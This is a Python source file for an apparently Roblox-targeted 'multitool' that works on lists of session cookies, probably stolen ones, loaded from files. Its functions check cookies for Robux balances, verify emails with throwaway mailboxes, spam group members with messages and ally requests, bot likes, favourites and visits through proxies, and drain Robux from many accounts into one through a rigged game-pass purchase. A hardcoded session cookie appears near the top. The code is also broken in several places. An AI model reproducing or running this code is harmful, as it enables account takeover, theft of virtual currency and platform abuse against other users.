# Imports
import json, traceback, ctypes, os, time, random, webbrowser,threading
import requests
from colorama import Fore, Back, Style, init
from bs4 import BeautifulSoup
from pprint import pprint

init()
# Dummy Variables
dislike = 0
like = 0
visit= 0
ally_sent = 0
# Global Variables for threads to share
globalcsrf_token = None
proxies = None
cookies = None
passwrd = None
test_cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_5AE1B37130EAA77EAA644B7EA561E935CBD1CE4FA76E524052478E7875B2F69A0F326C00CE1E9F484AAD02A7849E54FA6212AF7993695261AB1B6C8E17516C3FE4628B0F96A29FB374449E403E87522BCEF3A4F0A4578D1248643329B272E1A8627F1B78EDC1A0E096944817536E4CDECFBA9A0CE0D2E20C89A3E8BAF7360CA29849038ED99B865B5ED0266BABE4427B373506CB758C9FC2556D7D7014873E5ED5CD44E83928030457E1CF12BDAAA9DDE0F087159EDD85FAA089BC3F192CC55858EE606797AE43B0449BE7938EAD37DCF8659CE827F4CE3BB1B1402BEE8D798FCF8E84339734D92A125DF16CF74A3BD2ACCB4802CF9393667F3056BF1161B5D42F0FA381F040E4C785B4741A7D9AFE396B3A4D18C34500F8B2C0294E0BFD684A2D1BE99F8FDEC77A728083A7D268ED4D5CEF9D8D"

# Init function - Zz
def init_proxies_and_cookies():
    """
    Using `with` to open the files instead 
    of opening and reading within one line 
    allows us to open the file without 
    having to close it yet it is properly 
    closed once the process is complete
    """
    global proxies

    with open("proxies.txt", "r") as proxy_file:
        proxies = [
            {"https": "http://" + proxy} for proxy in proxy_file.read().splitlines()
        ]

    global cookies
    print("Cookie format:\n[1] user:pass:cookie\n[2] Only cookie\n")
    foramt = int(input_sys())
    if format == 1:
        cookies = [cookie.split(':',2)[2] for cookie in cookies]
        with open("cookies.txt", "r") as cookies_file:
            cookies_not = cookies_file.read().splitlines()
            cookies = [cookie.split(':',2)[2] for cookie in cookies_not]
            passwrd = [cookie.split(':',2)[1] for cookie in cookies_not]
    elif format == 2:
        with open("cookies.txt", "r") as cookies_file:
            cookies = cookies_file.read().splitlines()


# Funcs
def input_sys():
    print(f"{Fore.YELLOW}>>> {Style.RESET_ALL}", end="")
    word = input()
    return word


def clearscreen():
    os.system("cls")

# Get users in group, returns in table wait im not sure
def get_group_members(group_id):
    cursor = ""
    while True:
        response = requests.get(url=f"https://groups.roblox.com/v1/groups/{group_id}/users?limit=100&sortOrder=Desc&cursor={cursor}").json()

        x = [e["user"]["userId"] for e in response['data']]
            # print(e["user"]["userId"])

        if not response["nextPageCursor"]:
            break
        cursor = response["nextPageCursor"]
    return x
# Clothing Downloader -- Tvnyl
def asset_Downloaderv1():
    id_ = int(input('id: '))
    req_to_get_template = requests.get(f'https://assetdelivery.roblox.com/v1/asset/?id={id_}')


    open(f'configs\config.xml', 'wb').write(req_to_get_template.content)
    with open(f'configs\config.xml', 'r') as f: 
        data = f.read() 
    Bs_data = BeautifulSoup(data, "lxml") 
    b_unique = Bs_data.find('url').text
    template_Id = b_unique.split('?')[1].split('=')[1]

    download_image = requests.get(f'https://www.roblox.com/library/{template_Id}')
    soup = BeautifulSoup(download_image.content, "html.parser")
    img_temp_link = soup.find('span', class_='thumbnail-span').img['src']

    request_to_download_temp = requests.get(img_temp_link)

    with open(f'clothing\{id_}.jpeg', 'wb') as f:
        f.write(request_to_download_temp.content)

    open(f'configs\config.xml', 'wb').truncate(0)

# Message Bot
def message_bot(groupId, id, cookie,subject,body):
    """
    groupId:str -> groupId target
    id:int -> Id of user
    cookie:str -> Cookie
    subject:str -> Subject of message
    body:str -> Body of message
    """
    req = requests.Session()
    req.cookies[".ROBLOSECURITY"] = cookie
    try:
        r = req.get("http://www.roblox.com/mobileapi/userinfo").json()
        r = req.post("https://www.roblox.com/api/item.ashx?")
        req.headers["X-CSRF-TOKEN"] = r.headers["X-CSRF-TOKEN"]
    except:
        print("[" + Fore.RED + "!" + Style.RESET_ALL + "]" + " Invalid Cookie")
    time.sleep(1)
    print("[" + Fore.BLUE + "!" + Style.RESET_ALL + "]" + " Getting members for target group")
    members = get_group_members(str(groupId))
    print("[" + Fore.BLUE + "!" + Style.RESET_ALL + "]" + " Total Members "+str(len(members)))
    # ok
    for i in members:
        headerformat = {
            "userId": int(i),
            "subject": subject,
            "body": body,
            "recipientId": int(i), # idk the person recieving the messg #look in the development channel at the pic
            "replyMessageId": 0,
            "includePreviousMessage": False
        }
        req2 = req.post(url='https://privatemessages.roblox.com/v1/messages/send', data=headerformat)
        if req2.status_code == 200:
            if req2.json()['message']=="Sorry, an error occurred sending your message.":
                print("[" + Fore.RED + "!" + Style.RESET_ALL + "]" + " User Message Settings Disabled | Id "+str(i))
            elif req2.json()['errors']:
                print("[" + Fore.YELLOW + "!" + Style.RESET_ALL + "]" + " Ratelimited Retrying")
            else:
                time.sleep(1)
                print("[" + Fore.GREEN + "!" + Style.RESET_ALL + "]" + " Sent message to "+str(i))
                time.sleep(1)

# Email Verifier -- Tvnyl
def email_verifier(cookie):
    """
    cookie:str -> Given through for loop
    """
    req = requests.Session()
    req.cookies[".ROBLOSECURITY"] = cookie
    try:
        r = req.get("http://www.roblox.com/mobileapi/userinfo").json()
        r = req.post("https://www.roblox.com/api/item.ashx?")
        req.headers["X-CSRF-TOKEN"] = r.headers["X-CSRF-TOKEN"]
    except:
        print("[" + Fore.RED + "!" + Style.RESET_ALL + "]" + " Invalid Cookie")
    generate_email = requests.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1').json()
    email = generate_email[0]
    # Splits
    login = email.split("@")[0]
    domain = email.split("@")[1]
    # Update Email
    # get messages
    get_mesgid = requests.get(f'https://www.1secmail.com/api/v1/?action=getMessages&login={login}&domain={domain}').json()

    id_ = get_mesgid[0]['id']
    message_cont = requests.get(f'https://www.1secmail.com/api/v1/?action=readMessage&login={login}&domain={domain}&id={id_}')
    content = message_cont.json()['body']
    # print(content)
    soup = BeautifulSoup(content, 'html.parser')
    link = soup.find('a')['href']
    req2 = req.get(link)
    print("[" + Fore.GREEN + "!" + Style.RESET_ALL + "]" + " Verified Cookie with "+email)
    
# Get X-CSRF TOKEN -- SomethingElse
def getxcsrf(original_cookie: str):
    """
    Sends a dummy request to the same URL 
    with the given cookie and returns the 
    X-CSRF-TOKEN that gets returned in headers
    """

    url = f"https://www.roblox.com/api/item.ashx?"

    r = requests.post(url, cookies={".ROBLOSECURITY": original_cookie})

    if r.status_code == 403:
        try:
            return r.headers["x-csrf-token"]
        except:
            return None

    return None

# Auth Ticket Getter -- Tvnyl
def auth_ticket(cookie, gameid):
    """
    Cookie:list -> Passed through for loop
    """
    req = requests.Session()
    req.cookies[".ROBLOSECURITY"] = cookie
    try:
        r = req.get("http://www.roblox.com/mobileapi/userinfo").json()
        r = req.post("https://www.roblox.com/api/item.ashx?")
        req.headers["X-CSRF-TOKEN"] = r.headers["X-CSRF-TOKEN"]
    except:
        print("[" + Fore.RED + "!" + Style.RESET_ALL + "]" + "Invalid Cookie")
    req.headers.update({'referer': f"https://www.roblox.com/games/{gameid}"})
    req2 = req.post('https://auth.roblox.com/v1/authentication-ticket')
    auth_ticket = req2.headers['rbx-authentication-ticket']
    return auth_ticket

# Game  Visit Bot
def visit_bot(cookie, gameID):
    """
    Cookie:list -> Passed Through for loop
    gameID -> ID of chosen game
    """
    authTicket = auth_ticket(cookie=cookie, gameid=gameID)
    req = requests.Session()
    print("Hope you have multiple roblox downloaded....")
    req.cookies[".ROBLOSECURITY"] = cookie
    try:
        r = req.get("http://www.roblox.com/mobileapi/userinfo").json()
        r = req.post("https://www.roblox.com/api/item.ashx?")
        req.headers["X-CSRF-TOKEN"] = r.headers["X-CSRF-TOKEN"]
    except:
        print("[" + Fore.RED + "!" + Style.RESET_ALL + "]" + "Invalid Cookie") 
    browser_id = random.randint(1000000, 10000000)    
    url = "roblox-player:1+launchmode:play+gameinfo:"+authTicket+"+launchtime:"+str(20)+"+placelauncherurl:https%3A%2F%2Fassetgame.roblox.com%2Fgame%2FPlaceLauncher.ashx%3Frequest%3DRequestGame%26browserTrackerId%3D"+str(browser_id)+"%26placeId%3D"+str(gameID)+"%26isPlayTogetherGame%3Dfalse+browsertrackerid:"+str(browser_id)+"+robloxLocale:en_us+gameLocale:en_us"
    req2 = webbrowser.open(url)
    visit += 1
    ctypes.windll.kernel32.SetConsoleTitleW(
        f"Vintle Multitool | Visits Earned {visit}"
    )



# Vip Scraper -- Tvnyl
def vip_scraper():
    vip_servers = 0
    vip_url = "https://freerobloxvipservers.com/"
    req = requests.get(vip_url)
    soup = BeautifulSoup(req.content, "html.parser")
    vip_finder = soup.find_all("p", class_="text-sm mb-0")
    vip_link = [i.a["href"] for i in vip_finder]
    discord_link = "https://discord.gg/SdQ5u9x"
    if discord_link in vip_link:
        vip_link.remove(discord_link)
    with open("vip_links.txt", "w") as f:
        for i in vip_link:
            vip_servers += 1
            print(
                "[" 
                + Fore.GREEN 
                + "!" 
                + Style.RESET_ALL + "]"
                + f" Vip Servers Found {vip_servers}"
            )
            ctypes.windll.kernel32.SetConsoleTitleA(f"Vintle Multitool |")
            f.write(f"{i}\n")


# Ally Bot Thread Function -- SomethingElse
def runallythread(i, GroupId):
    global globalcsrf_token
    global proxies
    while True:
        targetID = random.randint(1, 7728165)
        try:
            ally_request = requests.session()
            ally_request.cookies[".ROBLOSECURITY"] = i
            ally_request.headers["X-CSRF-TOKEN"] = getxcsrf(i)
            ally_request = ally_request.post(
                url="https://groups.roblox.com/v1/groups/"
                + GroupId
                + "/relationships/allies/"
                + str(targetID),
                proxies=random.choice(proxies),
            )
            if ally_request.status_code == 200:
                ally_sent += 1
                print(
                    "["
                    + Fore.GREEN
                    + "!"
                    + Style.RESET_ALL
                    + "] Sent ally request to "
                    + str(targetID)
                )
                ctypes.windll.kernal32.SetConsoleTitleW(f"Vintle Multitool | All Requests Sent {ally_sent}")
            else:
                if ally_request.status_code == 403:
                    getxcsrf(i)
                else:
                    if ally_request.status_code == 429:
                        pass
        except:
            pass


# Cookie Checker -- Tvnyl
def Cookie_checker(i):
    robux_acc = 0
    email_verify = 0
    req = requests.Session()
    req.cookies[".ROBLOSECURITY"] = i
    try:
        r = req.get("http://www.roblox.com/mobileapi/userinfo").json()
        r = req.post("https://www.roblox.com/api/item.ashx?")
        req.headers["X-CSRF-TOKEN"] = r.headers["X-CSRF-TOKEN"]
    except:
        print("[" + Fore.RED + "!" + Style.RESET_ALL + "]" + "Invalid Cookie")
    req2 = req.get("https://api.roblox.com/my/balance")
    req3 = req.get("https://accountsettings.roblox.com/v1/email").json()
    try:
        z = req2.json()["errors"]
    except:
        robux = req2.json()["robux"]
        robux_acc += 1
        print(
            "[" + Fore.LIGHTGREEN_EX + "!" + Style.RESET_ALL + "]"
            " Foud Cookie with Robux"
        )
        ctypes.windll.kernel32.SetConsoleTitleA(
            f"Vintle Multitool | Accounts With Robux Found: {robux_acc}"
        )
        verify = req3["verified"]
        if verify == True:
            email_verify += 1
            print(
                "[" + Fore.LIGHTGREEN_EX + "!" + Style.RESET_ALL + "]"
                " Found Cookie with Verified Email"
            )
            ctypes.windll.kernel32.SetConsoleTitleW(
                f"Vintle Multitool | Accounts With Verified Email: {email_verify}"
            )
            with open("checked_cookies.txt", "w") as f:
                f.write(f"{i}\n | Robux {robux} | Email Verified")
        else:
            with open("checked_cookies.txt", "w") as f:
                f.write(f"{i}\n | Robux {robux} | Email NotVerified")


def get_all_user_games(userid: int):
    url = "https://games.roblox.com/v2/users/175656524/games?sortOrder=Asc&limit=100"
    data = []
    cursor = ""
    while cursor != None:
        # Assumes that the response is valid
        r = requests.get(f"{url}&cursor={cursor}").json()
        cursor = r["nextPageCursor"]
        data += r["data"]
    return data


def toggle(cookie):
    req = requests.Session()
    req2 = requests.Session()
    req.cookies[".ROBLOSECURITY"] = cookie
    r = req.get("http://www.roblox.com/mobileapi/userinfo")
    if "mobileapi/user" not in r.url:
        time.sleep(10)
    else:
        print("Cookie has been validated")
    r = req.post("https://www.roblox.com/api/item.ashx?")
    req.headers["X-CSRF-TOKEN"] = r.headers["X-CSRF-TOKEN"]


def change(price: int, asset_id: int):
    try:
        r = requests.post(
            f"https://itemconfiguration.roblox.com/v1/assets/{str(asset_id)}/update-price",
            json={"priceConfiguration": {"priceInRobux": price}},
            proxies=random.choice(proxies),
        )
        if "X-CSRF-TOKEN" in r.headers:
            req.headers["X-CSRF-TOKEN"] = r.headers["X-CSRF-TOKEN"]
            toggle(price)
        if r.json() != {}:
            print(r.json())
    except:
        change(price)


def get_product_info(asset_id: int):
    r = requests.get(
        f"https://api.roblox.com/Marketplace/ProductInfo?assetId={str(asset_id)}"
    )

    if r.status_code == 200:
        return r.json()
    else:
        return None


def get_current_robux(cookie: str):
    url = "https://api.roblox.com/users/account-info%27"

    r = requests.get(url, cookies={".ROBLOSECURITY": cookie})

    if r.status_code == 200:
        return r.json()["RobuxBalance"]
    else:
        return None


def buy_asset(asset_id: int, expected_price: int, cookie: str) -> bool:
    product = get_product_info(asset_id)

    productid = product["ProductId"]
    creatorid = product["Creator"]["Id"]

    url = f"https://economy.roblox.com/v1/purchases/products/{str(productid)}"

    data = {
        "expectedCurrency": 1,
        "expectedPrice": expected_price,
        "expectedSellerId": creatorid,
    }

    r = requests.post(url, data=data, cookies={".ROBLOSECURITY": cookie})

    if r.status_code == 200:
        return True

    return False


# Transfer bot - Zz
def transfer_bot(
    recipient_cookie: str = None, target_cookies: list = None, game_pass_id: int = None
):
    """
    Transfer all robux from multiple given cookies to central account
    
    recipient_cookie: str -> Cookie to be recipient of all the robux
    target_cookies: list -> Cookies to take robux from
    game_pass_id: int -> The asset ID for the gamepass 
                         that will be used to transfer 
                         the robux
    """

    if not (recipient_cookie or target_cookies):
        print(
            "["
            + Fore.LIGHTRED_EX
            + "!"
            + Style.RESET_ALL
            + "] Recipient/targets were not clarified"
        )
        return

    if not game_pass_id:
        print(
            "["
            + Fore.LIGHTRED_EX
            + "!"
            + Style.RESET_ALL
            + "] GamePass ID was not clarified"
        )
        return

    for cookie in target_cookies:
        cookie: str

        rbx = get_current_robux(cookie)

        if not rbx:
            print(
                "["
                + Fore.LIGHTRED_EX
                + "!"
                + Style.RESET_ALL
                + "] Unable to get robux for the following cookie: "
                + cookie
            )

        change(rbx, game_pass_id)

        buy_asset(game_pass_id, rbx, cookie)


# Start Screen
def StartScreen():
    clearscreen()

    snd = f"""
    {Fore.MAGENTA}███████████████████████████████████████████████████████████████████████████████████████████████████████████{Fore.RESET}
    {Fore.LIGHTMAGENTA_EX}
    VVVVVVVV           VVVVVVVV  iiii                             tttt          lllllll
    V::::::V           V::::::V i::::i                         ttt:::t          l:::::l
    V::::::V           V::::::V  iiii                          t:::::t          l:::::l
    V::::::V           V::::::V                                t:::::t          l:::::l
     V:::::V           V:::::V iiiiiii nnnn  nnnnnnnn    ttttttt:::::ttttttt     l::::l     eeeeeeeeeeee
      V:::::V         V:::::V  i:::::i n:::nn::::::::nn  t:::::::::::::::::t     l::::l   ee::::::::::::ee
       V:::::V       V:::::V    i::::i n::::::::::::::nn t:::::::::::::::::t     l::::l  e::::::eeeee:::::ee
        V:::::V     V:::::V     i::::i nn:::::::::::::::ntttttt:::::::tttttt     l::::l e::::::e     e:::::e
         V:::::V   V:::::V      i::::i   n:::::nnnn:::::n      t:::::t           l::::l e:::::::eeeee::::::e
          V:::::V V:::::V       i::::i   n::::n    n::::n      t:::::t           l::::l e:::::::::::::::::e
           V:::::V:::::V        i::::i   n::::n    n::::n      t:::::t           l::::l e::::::eeeeeeeeeee
            V:::::::::V         i::::i   n::::n    n::::n      t:::::t    tttttt l::::l e:::::::e
             V:::::::V         i::::::i  n::::n    n::::n      t::::::tttt:::::tl::::::le::::::::e
              V:::::V          i::::::i  n::::n    n::::n      tt::::::::::::::tl::::::l e::::::::eeeeeeee
               V:::V           i::::::i  n::::n    n::::n        tt:::::::::::ttl::::::l  ee:::::::::::::e
                VVV            iiiiiiii  nnnnnn    nnnnnn          ttttttttttt  llllllll   eeeeeeeeeeeeee
    {Fore.RESET}
    {Fore.MAGENTA}███████████████████████████████████████████████████████████████████████████████████████████████████████████{Fore.RESET}
                    {Fore.BLUE} 1) {Fore.CYAN} N/A          {Fore.BLUE} 7) {Fore.CYAN} N/A          {Fore.BLUE} 13) {Fore.CYAN} N/A         {Fore.BLUE} 19) {Fore.CYAN} N/A
                    {Fore.BLUE} 2) {Fore.CYAN} N/A          {Fore.BLUE} 8) {Fore.CYAN} N/A          {Fore.BLUE} 14) {Fore.CYAN} N/A         {Fore.BLUE} 20) {Fore.CYAN} N/A
                    {Fore.BLUE} 3) {Fore.CYAN} N/A          {Fore.BLUE} 9) {Fore.CYAN} N/A          {Fore.BLUE} 15) {Fore.CYAN} N/A         {Fore.BLUE} 21) {Fore.CYAN} N/A
                    {Fore.BLUE} 4) {Fore.CYAN} N/A          {Fore.BLUE} 10) {Fore.CYAN} N/A         {Fore.BLUE} 16) {Fore.CYAN} N/A         {Fore.BLUE} 22) {Fore.CYAN} N/A
                    {Fore.BLUE} 5) {Fore.CYAN} N/A          {Fore.BLUE} 11) {Fore.CYAN} N/A         {Fore.BLUE} 17) {Fore.CYAN} N/A         {Fore.BLUE} 23) {Fore.CYAN} N/A
                    {Fore.BLUE} 6) {Fore.CYAN} N/A          {Fore.BLUE} 12) {Fore.CYAN} N/A         {Fore.BLUE} 18) {Fore.CYAN} N/A         {Fore.BLUE} 24) {Fore.CYAN} N/A
    
    {Fore.MAGENTA}███████████████████████████████████████████████████████████████████████████████████████████████████████████{Fore.RESET}
    """
    print(snd)
    input_sys()


# Favourite Bot -- Tvnyl
def favorite(i):
    favorited = 0
    checked = 0
    print("Asset/Game ID")
    id_ = input_sys()
    req = requests.Session()
    try:
        req.cookies[".ROBLOSECURITY"] = i
        r = req.get(
            "http://www.roblox.com/mobileapi/userinfo", proxies=random.choice(proxies)
        ).json()
        r = req.post(
            "https://www.roblox.com/api/item.ashx?", proxies=random.choice(proxies)
        )
        req.headers["X-CSRF-TOKEN"] = r.headers["X-CSRF-TOKEN"]
    except:
        print("[" + Fore.RED + "!" + Style.RESET_ALL + "]" + "Invalid Cookie")
    data = {"itemTargetId": id_, "favoriteType": "asset"}
    try:
        r = req.post(
            "https://web.roblox.com/v2/favorite/toggle",
            data=data,
            proxies=random.choice(proxies),
        )
        if r.json()["message"] == "Too Many Attempts":
            print("[" + Fore.YELLOW + "!" + Style.RESET_ALL + "] Too Many Attempts, Retrying!")
        else:
            favorited += 1
            print(
                f"["
                + Fore.GREEN
                + "!"
                + Style.RESET_ALL
                + "]"
                + f" Botted {favorited} favorites to game/asset: {id_}"
            )
    except:
        pass
    checked += 1
    ctypes.windll.kernel32.SetConsoleTitleW(
        f"Vintle Multitool | Favourites Earned {favorited}"
    )

# Universeid getter tvnyl
def universeID(gameId, cookie):
    """
    gameID: int -> ID of the game 
    cookie: string -> Cookies will be given through a for loop
    returns Universe ID
    """
    try:
        req = requests.Session()
        req.cookies[".ROBLOSECURITY"] = cookie
        r = req.get(
            "http://www.roblox.com/mobileapi/userinfo", proxies=random.choice(proxies)
        ).json()
        r = req.post(
            "https://www.roblox.com/api/item.ashx?", proxies=random.choice(proxies)
        )
        req.headers["X-CSRF-TOKEN"] = r.headers["X-CSRF-TOKEN"]
    except:
        print("[" + Fore.RED + "!" + Style.RESET_ALL + "]" + "Invalid Cookie")
    req1 = req.get(f'https://games.roblox.com/v1/games/multiget-place-details?placeIds={gameId}')
    universeId = req1.json()[0]['universeId']
    return universeId

# Game Like or Dislike BOT-- Tvnyl
def game_vote_bot(gameID, cookie, vote):
    """
    gameID: int>str -> ID of the game 
    cookie: string -> Cookies will be given through a for loop
    vote: bool -> True (Upvote) or False (Downvote)
    """
    if vote==False:
        ctypes.windll.kernel32.SetConsoleTitleW(
            f"Vintle Multitool | Dislikes Botted {dislike}"
        )
    elif vote==True:
        ctypes.windll.kernel32.SetConsoleTitleW(
            f"Vintle Multitool | Likes Botted {like}"
        )
    try:
        req = requests.Session()
        req.cookies[".ROBLOSECURITY"] = cookie
        r = req.get(
            "http://www.roblox.com/mobileapi/userinfo", proxies=random.choice(proxies)
        ).json()
        r = req.post(
            "https://www.roblox.com/api/item.ashx?", proxies=random.choice(proxies)
        )
        req.headers["X-CSRF-TOKEN"] = r.headers["X-CSRF-TOKEN"]
    except:
        print("[" + Fore.RED + "!" + Style.RESET_ALL + "]" + "Invalid Cookie")
    id_ = universeID(gameID, cookie)
    data = {'vote': vote}
    req2 = req.patch(f"https://games.roblox.com/v1/games/{id_}/user-votes", data=data)
    if vote == False:
        dislike += 1
        print(
            '['
            +Fore.LIGHTGREEN_EX
            +'!'
            +Style.RESET_ALL
            +f'] Dislike: {dislike}'
        )
        ctypes.windll.kernel32.SetConsoleTitleW(
            f"Vintle Multitool | Dislikes Botted {dislike}"
        )
    elif vote == True:
        like += 1
        print(
            '['
            +Fore.LIGHTGREEN_EX
            +'!'
            +Style.RESET_ALL
            +f'] Like: {like}'
        )
        ctypes.windll.kernel32.SetConsoleTitleW(
            f"Vintle Multitool | Likes Botted {like}"
        )        
class CookieRefresh:
    def __init__(self, list_of_cookies):
        if len(list_of_cookies) > 1:
            list_one, list_two = list_of_cookies[::2], list_of_cookies[1::2]

            for n in range(2):
                thread = threading.Thread(target=self.run, args=[list_one if n == 1 else list_two])
                thread.start()

        else:
            list_one = list_of_cookies
            self.run(list_one)

    def run(self, lst):
        for i in lst:
            try:
                CSRF = requests.post('https://auth.roblox.com/v2/logout', cookies={'.ROBLOSECURITY': i}).headers['x-csrf-token']
            except:
                print("[" + Fore.RED + "!" + Style.RESET_ALL + "]" + "Invalid Cookie")
                continue

            r = requests.post('https://auth.roblox.com/v2/logout', cookies={'.ROBLOSECURITY': i}, headers={'X-CSRF-TOKEN': CSRF})
            print("[" + Fore.RED + "!" + Style.RESET_ALL + "]" + "Invalid Cookie")

init_proxies_and_cookies()

